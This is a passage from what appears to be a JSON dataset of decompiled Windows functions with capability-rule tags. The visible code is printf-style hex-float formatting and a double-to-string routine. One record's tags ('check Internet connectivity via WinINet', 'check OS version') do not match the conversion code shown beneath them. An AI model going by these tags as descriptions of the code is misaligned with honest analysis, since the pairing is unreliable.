}\n        else {\n            if (uVar6 < 1) {\n                uVar6 = *(arg3 + 1);\n                uVar10 = 0;\n                arg2._0_2_ = 0;\n                goto code_r0x000140019626;\n            }\n            uVar10 = 0;\n            arg2._0_2_ = 0;\n            iVar7 = 0x10;\n            arg1 = 0;\n        }\ncode_r0x000140019544:\n        uVar6 = *(arg3 + 1);\n        puVar12 = &uStack88;\n        do {\n            uVar4 = arg1 & 0xf;\n            cVar2 = uVar4;\n            if (iVar7 == 1) {\n                if (((&uStack88 < puVar12) || ((uVar6 & 0x800) != 0)) || (0 < *(arg3 + 2))) {\n                    *puVar12 = 0x2e;\n                    puVar12 = puVar12 + 1;\n                    goto code_r0x0001400195b2;\n                }\n                if ((arg1 & 0xf) == 0) {\n                    if (*(arg3 + 2) == 0) {\n                        *puVar12 = 0x30;\n                        puVar12 = puVar12 + 1;\n                    }\n                    break;\n                }\ncode_r0x0001400195b6:\n                if (uVar4 < 10) {\ncode_r0x000140019578:\n                    uVar3 = cVar2 + 0x30;\n                }\n                else {\n                    uVar3 = cVar2 + 0x37U | uVar6 & 0x20;\n                }\n                *puVar12 = uVar3;\n                puVar12 = puVar12 + 1;\n            }\n            else {\n                if (0 < *(arg3 + 2)) {\n                    *(arg3 + 2) = *(arg3 + 2) + -1;\n                }\ncode_r0x0001400195b2:\n                if ((arg1 & 0xf) != 0) goto code_r0x0001400195b6;\n                if ((&uStack88 < puVar12) || (-1 < *(arg3 + 2))) goto code_r0x000140019578;\n            }\n            arg1 = arg1 >> 4;\n            iVar7 = iVar7 + -1;\n        } while (iVar7 != 0);\n        if (puVar12 == &uStack88) {\n            if (*(arg3 + 2) < 1) goto code_r0x000140019626;\n            goto code_r0x00014001962e;\n        }\n        iVar7 = *(arg3 + 0xc);\n        iVar16 = 2;\n        if (0 < iVar7) goto code_r0x00014001978c;\ncode_r0x000140019652:\n        if ((uVar6 & 0x80) != 0) goto code_r0x000140019850;\ncode_r0x00014001965b:\n        if ((uVar6 & 0x100) == 0) {\n            if ((uVar6 & 0x40) != 0) {\n                fcn.140017f90(0x20, arg3);\n            }\n        }\n        else {\n            fcn.140017f90(0x2b, arg3);\n        }\n    }\n    else {\n        arg2._0_2_ = arg2 + -3;\n        if (uVar6 < 0xf) goto code_r0x0001400195d5;\n        uVar10 = arg2;\n        iVar7 = 0x10;\n        if ((arg1 != 0) || (0 < uVar6)) goto code_r0x000140019544;\n        uVar6 = *(arg3 + 1);\ncode_r0x000140019626:\n        puVar12 = &uStack88;\n        if ((uVar6 & 0x800) != 0) {\ncode_r0x00014001962e:\n            uStack88 = 0x2e;\n            puVar12 = auStack87;\n        }\n        iVar7 = *(arg3 + 0xc);\n        *puVar12 = 0x30;\n        puVar12 = puVar12 + 1;\n        iVar16 = 2;\n        if (iVar7 < 1) goto code_r0x000140019652;\ncode_r0x00014001978c:\n        iVar16 = 2;\n        iVar8 = puVar12 - (*0x20 + -0x58);\n        if (0 < *(arg3 + 2)) {\n            iVar8 = *(arg3 + 2) + iVar8;\n        }\n        iVar14 = (iVar8 + 6) - ((uVar6 & 0x1c0) == 0);\n        iVar8 = arg2 / 10 - (arg2 >> 0x1f);\n        iVar15 = iVar14;\n        if (iVar8 != 0) {\n            do {\n                iVar15 = iVar15 + 1;\n                iVar8 = iVar8 / 10;\n            } while (iVar8 != 0);\n            iVar16 = (iVar15 - iVar14) + 2;\n        }\n        if (iVar7 <= iVar15) {\n            iVar7 = -1;\ncode_r0x0001400198f6:\n            *(arg3 + 0xc) = iVar7;\n            goto code_r0x000140019652;\n        }\n        iVar7 = iVar7 - iVar15;\n        if ((uVar6 & 0x600) != 0) goto code_r0x0001400198f6;\n        *(arg3 + 0xc) = iVar7 + -1;\n        do {\n            fcn.140017f90(0x20, arg3);\n            iVar7 = *(arg3 + 0xc);\n            *(arg3 + 0xc) = iVar7 + -1;\n        } while (0 < iVar7);\n        uVar6 = *(arg3 + 1);\n        if ((uVar6 & 0x80) == 0) goto code_r0x00014001965b;\ncode_r0x000140019850:\n        fcn.140017f90(0x2d, arg3);\n    }\n    fcn.140017f90(0x30, arg3);\n    fcn.140017f90(*(arg3 + 1) & 0x20 | 0x58, arg3);\n    if ((0 < *(arg3 + 0xc)) && ((*(arg3 + 9) & 2) != 0)) {\n        *(arg3 + 0xc) = *(arg3 + 0xc) + -1;\n        do {\n            fcn.140017f90(0x30, arg3);\n            iVar7 = *(arg3 + 0xc);\n            *(arg3 + 0xc) = iVar7 + -1;\n        } while (0 < iVar7);\n    }\n    if (&uStack88 < puVar12) {\n        do {\n            uVar6 = puVar12[-1];\n            puVar12 = puVar12 + -1;\n            if (uVar6 == 0x2e) {\n                fcn.140018c00(arg3);\n            }\n            else if (uVar6 == 0x2c) {\n                iStack90 = *(arg3 + 4);\n                if (*(arg3 + 4) != 0) {\n                    fcn.140017ff0(&iStack90, 1, arg3);\n                }\n            }\n            else {\n                fcn.140017f90(uVar6, arg3);\n            }\n        } while (puVar12 != &uStack88);\n    }\n    while (iVar7 = *(arg3 + 2),  *(arg3 + 2) = iVar7 + -1,  0 < iVar7) {\n        fcn.140017f90(0x30, arg3);\n    }\n    fcn.140017f90(*(arg3 + 1) & 0x20 | 0x50, arg3);\n    *(arg3 + 0xc) = *(arg3 + 0xc) + iVar16;\n    *(arg3 + 1) = *(arg3 + 1) | 0x1c0;\n    iVar7 = *(arg3 + 2);\n    uVar6 = *(arg3 + 1);\n    iVar16 = *(arg3 + 0xc);\n    auStack112[0] = 0x1400188c7;\n    iVar5 = fcn.1400147b0(uVar10);\n    iVar5 = -iVar5;\n    pcVar1 = acStack72 + iVar5;\n    if ((uVar6 & 0x80) == 0) {\ncode_r0x0001400188e6:\n        pcVar11 = pcVar1;\n        if (uVar10 != 0) goto code_r0x0001400188f2;\n    }\n    else {\n        if (-1 < uVar10) {\n            uVar6 = uVar6 & 0xffffff7f;\n            *(arg3 + 1) = uVar6;\n            goto code_r0x0001400188e6;\n        }\n        uVar10 = -uVar10;\ncode_r0x0001400188f2:\n        pcVar11 = pcVar1;\n        while( true ) {\n            pcVar13 = pcVar11;\n            pcVar11 = pcVar13 + 1;\n            uVar9 = uVar10 / 10;\n            *pcVar13 = uVar10 + uVar9 * -10 + '0';\n            if (uVar10 < 10) break;\n            uVar10 = uVar9;\n            if ((((pcVar1 != pcVar11) && ((uVar6 & 0x1000) != 0)) && (*(arg3 + 4) != 0)) &&\n               ((pcVar11 - pcVar1 & 0x8000000000000003U) == 3)) {\n                *pcVar11 = ',';\n                pcVar11 = pcVar13 + 2;\n            }\n        }\n    }\n    pcVar13 = pcVar11;\n    if (iVar7 < 1) {\ncode_r0x0001400189b0:\n        pcVar11 = pcVar13;\n        if ((pcVar1 != pcVar13) || (iVar7 == 0)) goto code_r0x0001400189c1;\n    }\n    else {\n        iVar8 = iVar7 - (pcVar11 - pcVar1);\n        if (0 < iVar8) {\n            pcVar13 = pcVar11 + iVar8;\n            *(auStack112 + iVar5) = 0x1400189b0;\n            sub.msvcrt.dll_memset(pcVar11, 0x30, iVar8);\n            goto code_r0x0001400189b0;\n        }\n        pcVar13 = pcVar1;\n        if (pcVar1 != pcVar11) goto code_r0x0001400189c1;\n    }\n    *pcVar13 = '0';\n    pcVar11 = pcVar13 + 1;\ncode_r0x0001400189c1:\n    if (0 < iVar16) {\n        iVar16 = iVar16 - (pcVar11 - pcVar1);\n        *(arg3 + 0xc) = iVar16;\n        if (0 < iVar16) {\n            if ((uVar6 & 0x1c0) != 0) {\n                *(arg3 + 0xc) = iVar16 + -1;\n            }\n            if ((iVar7 < 0) && ((uVar6 & 0x600) == 0x200)) {\n                iVar7 = *(arg3 + 0xc);\n                *(arg3 + 0xc) = iVar7 + -1;\n                if (0 < iVar7) {\n                    *(auStack112 + iVar5) = 0x140018ba9;\n                    sub.msvcrt.dll_memset(pcVar11, 0x30, iVar7);\n                    *(arg3 + 0xc) = 0xffffffff;\n                    pcVar11 = pcVar11 + iVar7;\n                }\n            }\n            else if (((uVar6 & 0x400) == 0) && (iVar7 = *(arg3 + 0xc),  *(arg3 + 0xc) = iVar7 + -1,  0 < iVar7)) {\n                do {\n                    *(auStack112 + iVar5) = 0x140018bdd;\n                    fcn.140017f90(0x20, arg3);\n                    iVar7 = *(arg3 + 0xc);\n                    *(arg3 + 0xc) = iVar7 + -1;\n                } while (0 < iVar7);\n                uVar6 = *(arg3 + 1);\n            }\n        }\n    }\n    if ((uVar6 & 0x80) == 0) {\n        if ((uVar6 & 0x100) == 0) {\n            if ((uVar6 & 0x40) != 0) {\n                *pcVar11 = ' ';\n                pcVar11 = pcVar11 + 1;\n            }\n        }\n        else {\n            *pcVar11 = '+';\n            pcVar11 = pcVar11 + 1;\n        }\n    }\n    else {\n        *pcVar11 = '-';\n        pcVar11 = pcVar11 + 1;\n    }\n    if (pcVar1 < pcVar11) {\n        do {\n            pcVar11 = pcVar11 + -1;\n            if (((uVar6 & 0x4000) == 0) && (iVar7 = *(arg3 + 0x24),  *(arg3 + 5) == iVar7 || *(arg3 + 5) < iVar7)) {\ncode_r0x000140018a2a:\n                *(arg3 + 0x24) = iVar7 + 1;\n            }\n            else {\n                if ((uVar6 & 0x2000) == 0) {\n                    *(*arg3 + *(arg3 + 0x24)) = *pcVar11;\n                    iVar7 = *(arg3 + 0x24);\n                    goto code_r0x000140018a2a;\n                }\n                *(auStack112 + iVar5) = 0x140018a62;\n                sub.msvcrt.dll_fputc();\n                *(arg3 + 0x24) = *(arg3 + 0x24) + 1;\n            }\n            if (pcVar1 == pcVar11) break;\n            uVar6 = *(arg3 + 1);\n        } while( true );\n    }\n    iVar7 = *(arg3 + 0xc);\n    while( true ) {\n        *(arg3 + 0xc) = iVar7 + -1;\n        if (iVar7 < 1) break;\n        if (((*(arg3 + 1) & 0x4000) != 0) ||\n           (iVar16 = *(arg3 + 0x24),  iVar7 = iVar7 + -1,  *(arg3 + 5) != iVar16 && iVar16 <= *(arg3 + 5))) {\n            if ((*(arg3 + 1) & 0x2000) == 0) {\n                *(*arg3 + *(arg3 + 0x24)) = 0x20;\n                iVar16 = *(arg3 + 0x24);\n                iVar7 = *(arg3 + 0xc);\n            }\n            else {\n                *(auStack112 + iVar5) = 0x140018aba;\n                sub.msvcrt.dll_fputc();\n                iVar16 = *(arg3 + 0x24);\n                iVar7 = *(arg3 + 0xc);\n            }\n        }\n        *(arg3 + 0x24) = iVar16 + 1;\n    }\n    return;\n}\n",
        "token_count": 3957
    },
    "14001a6e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00014001aa05: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00014001aa0a)\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t * fcn.14001a6e0(int32_t *arg1, ulong arg2, uint32_t *arg3, uint32_t *arg4)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    uint64_t arg1_00;\n    int64_t iVar11;\n    char *pcVar12;\n    uint64_t uVar13;\n    uint32_t *puVar14;\n    uint32_t uVar15;\n    uint32_t *puVar16;\n    uint32_t *puVar17;\n    uint64_t unaff_RBX;\n    uint32_t *unaff_RSI;\n    uint64_t unaff_RDI;\n    uint8_t uVar18;\n    int32_t iVar19;\n    int64_t iVar20;\n    uint32_t uVar21;\n    uint64_t extraout_XMM0_Qa;\n    double dVar22;\n    double dVar23;\n    double dVar24;\n    double dVar25;\n    double dVar26;\n    uint32_t in_stack_00000028;\n    uint32_t in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    uint32_t **in_stack_00000040;\n    ulong uStack256;\n    uint32_t *puStack216;\n    uint32_t **ppuStack208;\n    uint64_t uStack200;\n    ulong uStack192;\n    uint32_t *puStack184;\n    ulong uStack176;\n    ulong uStack168;\n    uint32_t uStack160;\n    uint32_t uStack156;\n    ulong uStack152;\n    uint32_t *puStack144;\n    ulong uStack136;\n    uint32_t uStack128;\n    int32_t iStack124;\n    uint32_t uStack120;\n    int32_t iStack116;\n    double dStack112;\n    double dStack104;\n    uint32_t uStack96;\n    uint32_t uStack92;\n    uint32_t uStack76;\n    \n    uVar21 = *arg4;\n    uStack192 = uStack192 & 0xffffffff00000000 | in_stack_00000030;\n    uStack200 = uStack200 & 0xffffffff00000000 | arg2;\n    puStack216 = in_stack_00000038;\n    puStack184 = arg4;\n    ppuStack208 = in_stack_00000040;\n    *arg4 = uVar21 & 0xffffffcf;\n    uVar6 = uVar21 & 7;\n    if (uVar6 == 3) {\n        uVar21 = 8;\n        pcVar12 = \"Infinity\";\n        *in_stack_00000038 = 0xffff8000;\n        goto code_r0x00014001a4b0;\n    }\n    uVar9 = uVar21 & 4;\n    uStack176 = uStack176 & 0xffffffff00000000 | uVar21 & 0xffffffff00000004;\n    if ((uVar21 & 4) != 0) {\n        if (uVar6 != 4) {\n            return NULL;\n        }\n        uVar21 = 3;\n        pcVar12 = 0x14010fa39;\n        *in_stack_00000038 = 0xffff8000;\n        goto code_r0x00014001a4b0;\n    }\n    if (uVar6 != 0) {\n        iVar8 = *arg1;\n        uVar9 = 0;\n        iVar7 = 0x20;\n        if (0x20 < iVar8) {\n            do {\n                iVar19 = iVar7 * 2;\n                uVar9 = uVar9 + 1;\n                iVar4 = iVar7 * -2;\n                iVar7 = iVar19;\n            } while (iVar8 != iVar19 && SBORROW4(iVar8, iVar19) == iVar8 + iVar4 < 0);\n        }\n        uStack256 = 0x14001a77d;\n        uVar9 = fcn.14001ceb0(uVar9);\n        iVar20 = iVar8 + -1 >> 5;\n        puVar16 = arg3;\n        puVar14 = uVar9 + 0x18;\n        do {\n            uVar6 = *puVar16;\n            puVar16 = puVar16 + 1;\n            *puVar14 = uVar6;\n            puVar14 = puVar14 + 1;\n        } while (puVar16 <= arg3 + iVar20);\n        iVar10 = iVar20 * 4 + 4;\n        if (arg3 + iVar20 + 1U < arg3 + 1U) {\n            iVar10 = 4;\n        }\n        uVar13 = iVar10 >> 2 & 0xffffffff;\n        iVar20 = uVar9 + (iVar10 >> 2) * 4;\ncode_r0x00014001a7ed:\n        iVar7 = uVar13;\n        uVar6 = iVar7 - 1;\n        uVar13 = uVar6;\n        if (*(iVar20 + 0x14) == 0) goto code_r0x00014001a7e0;\n        *(uVar9 + 0x14) = iVar7;\n        puVar16 = uVar9 + 0x18 + uVar6 * 4;\n        uVar6 = 0x1f;\n        if (*puVar16 != 0) {\n            for (; *puVar16 >> uVar6 == 0; uVar6 = uVar6 - 1) {\n            }\n        }\n        uVar6 = iVar7 * 0x20 - (uVar6 ^ 0x1f);\n        goto code_r0x00014001a814;\n    }\n    goto code_r0x00014001a9e8;\ncode_r0x00014001a7e0:\n    iVar20 = iVar20 + -4;\n    if (uVar6 == 0) goto code_r0x00014001aa50;\n    goto code_r0x00014001a7ed;\ncode_r0x00014001b3e3:\n    uStack256 = 0x14001b3f3;\n    uVar9 = fcn.14001d010(uVar9, 10, 0);\n    if (iVar10 == iVar20) {\n        uStack256 = 0x14001b52d;\n        iVar10 = fcn.14001d010(iVar10, 10, 0);\n        iVar20 = iVar10;\n    }\n    else {\n        uStack256 = 0x14001b40f;\n        iVar10 = fcn.14001d010(iVar10, 10, 0);\n        uStack256 = 0x14001b422;\n        iVar20 = fcn.14001d010(iVar20, 10, 0);\n    }\n    uStack76 = uStack76 + 1;\n    puVar14 = puVar16;\n    goto code_r0x00014001b432;\ncode_r0x00014001ad2b:\n    uVar18 = uVar15 + 1;\ncode_r0x00014001ad34:\n    *puVar16 = uVar18;\n    uStack136._0_4_ = uVar21 + 1;\n    uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n    puVar17 = puStack144;\n    puVar16 = puVar14;\n    goto code_r0x00014001af35;\ncode_r0x00014001aa50:\n    *(uVar9 + 0x14) = 0;\ncode_r0x00014001a814:\n    uStack256 = 0x14001a81c;\n    uStack76 = fcn.14001c8b0(uVar9);\n    uStack152 = uStack200 & 0xffffffff | uStack152._4_4_ << 0x20;\n    if (uStack76 != 0) {\n        uStack256 = 0x14001aa6a;\n        fcn.14001c7b0(uVar9, uStack76);\n        uVar6 = uVar6 - uStack76;\n        uStack152 = uStack152 & 0xffffffff00000000 | uStack200 + uStack76;\n    }\n    if (*(uVar9 + 0x14) != 0) {\n        uStack256 = 0x14001a850;\n        fcn.14001d7b0(uVar9, &stack0xffffffffffffffb4);\n        iVar19 = uStack152 + uVar6;\n        iVar7 = iVar19 + -1;\n        uVar15 = extraout_XMM0_Qa >> 0x20 & 0xfffff | 0x3ff00000;\n        iVar4 = 1 - iVar19;\n        if (-1 < iVar7) {\n            iVar4 = iVar7;\n        }\n        dVar22 = ((extraout_XMM0_Qa & 0xffffffff | uVar15 << 0x20) - *0x14010fa40) * *0x14010fa48 + *0x14010fa50 +\n                 iVar7 * *0x14010fa58;\n        if (0 < iVar4 + -0x435) {\n            dVar22 = dVar22 + (iVar4 + -0x435) * *0x14010fa60;\n        }\n        uStack128 = dVar22;\n        if ((dVar22 < 0.0) && (uStack128 != dVar22)) {\n            uStack128 = uStack128 - 1;\n        }\n        dStack104 = extraout_XMM0_Qa & 0xffffffff | uVar15 + iVar7 * 0x100000 << 0x20;\n        iVar7 = uVar6 - iVar7;\n        uStack156 = iVar7 - 1;\n        if (uStack128 < 0x17) {\n            if (dStack104 < *(*0x140110920 + uStack128 * 8)) {\n                iStack116 = 0;\n                uStack128 = uStack128 - 1;\n                goto code_r0x00014001aa93;\n            }\n            iStack116 = 0;\n            uStack136 = uStack136._4_4_ << 0x20;\n            if (iVar7 < 1) {\n                uStack156 = 0;\n                uStack136 = CONCAT44(uStack136._4_4_, 1 - iVar7);\n            }\ncode_r0x00014001a980:\n            uStack156 = uStack156 + uStack128;\n            uStack120 = 0;\n            uVar15 = uStack128;\n        }\n        else {\n            iStack116 = 1;\ncode_r0x00014001aa93:\n            uStack136 = uStack136._4_4_ << 0x20;\n            if (uStack156 < 0) {\n                uStack156 = 0;\n                uStack136 = CONCAT44(uStack136._4_4_, 1 - iVar7);\n            }\n            if (-1 < uStack128) goto code_r0x00014001a980;\n            uStack136 = uStack136 & 0xffffffff00000000 | uStack136 - uStack128;\n            uStack120 = -uStack128;\n            uVar15 = 0;\n        }\n        if (in_stack_00000028 < 10) {\n            if (in_stack_00000028 < 6) {\n                bVar2 = iVar19 + 0x3fdU < 0x7f8;\n                if (in_stack_00000028 == 4) {\ncode_r0x00014001b854:\n                    iStack124 = 1;\n                }\n                else {\n                    if (in_stack_00000028 == 5) {\ncode_r0x00014001b6b8:\n                        iStack124 = 1;\n                        goto code_r0x00014001ae30;\n                    }\n                    if (in_stack_00000028 != 2) {\n                        if (in_stack_00000028 == 3) {\n                            iStack124 = 0;\n                            goto code_r0x00014001ae30;\n                        }\n                        goto code_r0x00014001ad68;\n                    }\n                    iStack124 = 0;\n                }\ncode_r0x00014001ab25:\n                uVar13 = 1;\n                if (0 < uStack192) {\n                    uVar13 = uStack192 & 0xffffffff;\n                }\n                uStack76 = uVar13;\n                uStack168 = uStack168 & 0xffffffff00000000 | uVar13;\n                uStack192 = uStack192 & 0xffffffff00000000 | uVar13;\n                uStack92 = uStack76;\n            }\n            else {\n                in_stack_00000028 = in_stack_00000028 - 4;\n                bVar2 = false;\n                if (in_stack_00000028 == 4) goto code_r0x00014001b854;\n                if (in_stack_00000028 == 5) goto code_r0x00014001b6b8;\n                iStack124 = 0;\n                if (in_stack_00000028 == 2) goto code_r0x00014001ab25;\n                in_stack_00000028 = 3;\ncode_r0x00014001ae30:\n                uStack92 = uStack128 + uStack192;\n                uVar1 = uStack92 + 1;\n                uStack168 = uStack168 & 0xffffffff00000000 | uVar1;\n                uVar13 = 1;\n                if (0 < uVar1) {\n                    uVar13 = uVar1;\n                }\n                uStack76 = uVar13;\n            }\n            uStack256 = 0x14001ab60;\n            dStack112 = dStack104;\n            uStack96 = uVar15;\n            puStack144 = fcn.14001a470(uVar13);\n            uStack160 = arg1[3] - 1;\n            dVar22 = dStack112;\n            uStack192._0_4_ = uStack96;\n            if (uStack160 == 0) {\ncode_r0x00014001abaa:\n                iVar20 = *0x140110920;\n                dVar24 = *0x14010fa78;\n                bVar2 = bVar2 & uStack168 < 0xf;\n                if ((!bVar2) || ((uStack128 | uStack160) != 0)) goto code_r0x00014001afd0;\n                uStack76 = 0;\n                if ((iStack116 != 0) && (dStack104 < *0x14010fa70)) {\n                    if (uStack168 == 0) {\n                        dVar22 = dStack104 + dStack104 + *0x14010fa88;\n                        dVar25 = dVar22 & 0xffffffff | (dVar22 >> 0x20) + 0xfcc00000 << 0x20;\n                        goto code_r0x00014001af95;\n                    }\n                    if (0 < uStack92) {\n                        dVar22 = dStack104 * *0x14010fa78;\n                        uVar21 = 0xffffffff;\n                        dVar25 = *0x14010fa80 * dVar22 + *0x14010fa88;\n                        dVar25 = dVar25 & 0xffffffff | (dVar25 >> 0x20) + 0xfcc00000 << 0x20;\n                        uStack168._0_4_ = uStack92;\n                        dVar23 = dVar22;\n                        goto code_r0x00014001ac3d;\n                    }\ncode_r0x00014001afbe:\n                    uStack160 = 0;\n                    goto code_r0x00014001afd0;\n                }\n                dVar25 = dStack104 + dStack104 + *0x14010fa88;\n                dVar25 = dVar25 & 0xffffffff | (dVar25 >> 0x20) + 0xfcc00000 << 0x20;\n                if (uStack168 != 0) {\n                    uVar21 = 0;\n                    dVar23 = dStack104;\ncode_r0x00014001ac3d:\n                    dVar26 = *(*0x140110920 + (uStack168 - 1) * 8);\n                    if (iStack124 != 0) {\n                        puVar16 = puStack144 + 1;\n                        dVar25 = *0x14010fab0 / dVar26 - dVar25;\n                        *puStack144 = dVar23 + 0x30;\n                        dVar24 = *0x14010fa78;\n                        dVar22 = *0x14010fa70;\n                        dVar23 = dVar23 - dVar23;\n                        puVar14 = puVar16;\n                        if (dVar25 <= dVar23) {\n                            do {\n                                if (dVar22 - dVar23 < dVar25) {\n                                    uVar15 = *(puVar14 + -1);\n                                    goto code_r0x00014001ad21;\n                                }\n                                uStack76 = uStack76 + 1;\n                                if (uStack168 <= uStack76) goto code_r0x00014001afbe;\n                                dVar23 = dVar23 * dVar24;\n                                puVar16 = puVar14 + 1;\n                                dVar25 = dVar25 * dVar24;\n                                iVar7 = dVar23;\n                                *puVar14 = iVar7 + 0x30;\n                                dVar23 = dVar23 - iVar7;\n                                puVar14 = puVar16;\n                            } while (dVar25 <= dVar23);\n                        }\n                        uStack136._0_4_ = uVar21 + 1;\n                        uStack176 = uStack176 & 0xffffffff00000000 | (dVar23 != 0.0) << 4;\n                        puVar17 = puStack144;\n                        goto code_r0x00014001af35;\n                    }\n                    dVar26 = dVar26 * dVar25;\n                    uStack76 = 1;\n                    puVar16 = puStack144;\n                    dVar25 = dVar22;\n                    bVar3 = false;\n                    while( true ) {\n                        iVar8 = dVar25;\n                        if (iVar8 != 0) {\n                            dVar25 = dVar25 - iVar8;\n                            bVar3 = bVar2;\n                        }\n                        uVar15 = iVar8 + 0x30;\n                        puVar14 = puVar16 + 1;\n                        *puVar16 = uVar15;\n                        if (uStack76 == uStack168) break;\n                        dVar25 = dVar25 * dVar24;\n                        uStack76 = uStack76 + 1;\n                        puVar16 = puVar14;\n                        bVar3 = bVar2;\n                    }\n                    if (!bVar3) {\n                        dVar25 = dVar22;\n                    }\n                    if (dVar26 + *0x14010fab0 < dVar25) {\ncode_r0x00014001ad21:\n                        do {\n                            puVar16 = puVar14 + -1;\n                            if (uVar15 != '9') goto code_r0x00014001ad2b;\n                            if (puStack144 == puVar16) {\n                                uVar21 = uVar21 + 1;\n                                uVar18 = 0x31;\n                                goto code_r0x00014001ad34;\n                            }\n                            uVar15 = *(puVar14 + -2);\n                            puVar14 = puVar16;\n                        } while( true );\n                    }\n                    if (dVar25 < *0x14010fab0 - dVar26) {\n                        uStack176 = uStack176 & 0xffffffff00000000 | (dVar25 != 0.0) << 4;\ncode_r0x00014001bcd0:\n                        do {\n                            puVar16 = puVar14;\n                            puVar14 = puVar16 + -1;\n                        } while (*(puVar16 + -1) == 0x30);\n                        uStack136._0_4_ = uVar21 + 1;\n                        puVar17 = puStack144;\n                        goto code_r0x00014001af35;\n                    }\n                    if (-1 < uStack152) {\n                        uStack160 = 0;\n                        if (-1 < arg1[5]) goto code_r0x00014001aebd;\n                        goto code_r0x00014001b308;\n                    }\n                    uStack160 = 0;\n                    iVar20 = 0;\n                    uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                    uVar21 = uStack120;\n                    goto code_r0x00014001b088;\n                }\ncode_r0x00014001af95:\n                if (dStack104 - *0x14010fa90 <= dVar25) {\n                    if ((dVar25 ^ *0x14010faa0) <= dStack104 - *0x14010fa90) goto code_r0x00014001afbe;\n                    goto code_r0x00014001b226;\n                }\n                uStack136._0_4_ = 2;\n                arg1_00 = 0;\n                iVar20 = 0;\ncode_r0x00014001af0f:\n                *puStack144 = 0x31;\n                uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n                puVar17 = puStack144;\n                puStack144 = puStack144 + 1;\n            }\n            else {\ncode_r0x00014001ab82:\n                uVar15 = 2;\n                if (-1 < uStack160) {\n                    uVar15 = uStack160;\n                }\n                uStack160 = uVar15;\n                if ((uVar21 & 8) != 0) {\n                    uStack160 = 3 - uVar15;\n                    goto code_r0x00014001abaa;\n                }\ncode_r0x00014001afd0:\n                if (uStack152 < 0) {\ncode_r0x00014001afde:\n                    if (iStack124 != 0) goto code_r0x00014001afea;\ncode_r0x00014001b308:\n                    iVar20 = 0;\n                    uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                    uVar21 = uStack120;\n                    goto code_r0x00014001b088;\n                }\ncode_r0x00014001aea8:\n                iVar20 = *0x140110920;\n                if (arg1[5] < uStack128) goto code_r0x00014001afde;\ncode_r0x00014001aebd:\n                dVar22 = *(iVar20 + uStack128 * 8);\n                if ((-1 < uStack192) || (0 < uStack168)) {\n                    uStack76 = 1;\n                    uStack136._0_4_ = uStack128 + 1;\n                    uVar6 = dStack104 / dVar22;\n                    *puStack144 = uVar6 + 0x30;\n                    dVar25 = *0x14010fa78;\n                    puVar5 = puStack144;\n                    for (dVar24 = dStack104 - uVar6 * dVar22; puVar14 = puVar5 + 1,  puVar17 = puStack144, \n                        puVar16 = puVar14,  dVar24 != 0.0; dVar24 = dVar24 * dVar25 - uVar6 * dVar22) {\n                        if (uStack76 == uStack168) {\n                            uVar21 = uStack128;\n                            if (uStack160 == 0) {\n                                uVar15 = *puVar5;\n                                if ((dVar22 < dVar24 + dVar24) || ((dVar24 + dVar24 == dVar22 && ((uVar6 & 1) != 0))))\n                                goto code_r0x00014001ad21;\n                                uStack176 = CONCAT44(uStack176._4_4_, 0x10);\n                                goto code_r0x00014001bcd0;\n                            }\n                            if (uStack160 == 1) {\n                                uVar15 = *puVar5;\n                                goto code_r0x00014001ad21;\n                            }\n                            uStack176 = CONCAT44(uStack176._4_4_, 0x10);\n                            break;\n                        }\n                        uStack76 = uStack76 + 1;\n                        uVar6 = (dVar24 * dVar25) / dVar22;\n                        *puVar14 = uVar6 + 0x30;\n                        puVar5 = puVar14;\n                    }\n                    goto code_r0x00014001af35;\n                }\n                if ((uStack168 == 0) && (dVar22 * *0x14010fa90 < dStack104)) {\n                    uStack136._0_4_ = uStack128 + 2;\n                    arg1_00 = 0;\n                    iVar20 = 0;\n                    goto code_r0x00014001af0f;\n                }\ncode_r0x00014001b226:\n                arg1_00 = 0;\n                iVar20 = 0;\ncode_r0x00014001b22b:\n                uStack176 = CONCAT44(uStack176._4_4_, 0x10);\n                uStack136._0_4_ = -uStack192;\n                puVar17 = puStack144;\n            }\n            uStack256 = 0x14001af28;\n            fcn.14001cfa0(arg1_00);\n            puVar16 = puStack144;\n            if (iVar20 == 0) goto code_r0x00014001af35;\n        }\n        else {\n            bVar2 = iVar19 + 0x3fdU < 0x7f8;\n            in_stack_00000028 = 0;\ncode_r0x00014001ad68:\n            uStack192 = uStack192 & 0xffffffff00000000 | uVar15;\n            uStack76 = iVar8 * *0x14010fa68 + 3;\n            uStack256 = 0x14001ad96;\n            uStack168 = dStack104;\n            puStack144 = fcn.14001a470(uStack76);\n            dVar22 = uStack168;\n            uStack160 = arg1[3] - 1;\n            if (uStack160 != 0) {\n                uStack192 = uStack192._4_4_ << 0x20;\n                iStack124 = 1;\n                uStack92 = 0xffffffff;\n                uStack168 = CONCAT44(uStack168._4_4_, 0xffffffff);\n                goto code_r0x00014001ab82;\n            }\n            uStack192 = uStack192._4_4_ << 0x20;\n            uStack168 = CONCAT44(uStack168._4_4_, 0xffffffff);\n            if (-1 < uStack152) {\n                iStack124 = 1;\n                uStack92 = 0xffffffff;\n                goto code_r0x00014001aea8;\n            }\n            uStack92 = 0xffffffff;\ncode_r0x00014001afea:\n            uStack76 = (iVar8 - uVar6) + 1;\n            uVar21 = uStack120;\n            if (uStack152 - (iVar8 - uVar6) < arg1[1]) {\n                if ((in_stack_00000028 - 3 & 0xfffffffd) == 0) goto code_r0x00014001b700;\n                uStack76 = (uStack152 - arg1[1]) + 1;\n                if ((1 < in_stack_00000028 && 0 < uStack168) && (uStack168 < uStack76)) {\n                    if (uStack168 - 1 <= uStack120) {\n                        uStack156 = uStack156 + uStack168;\n                        uStack76 = uStack168;\n                        uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                        uStack136 = uStack136 & 0xffffffff00000000 | 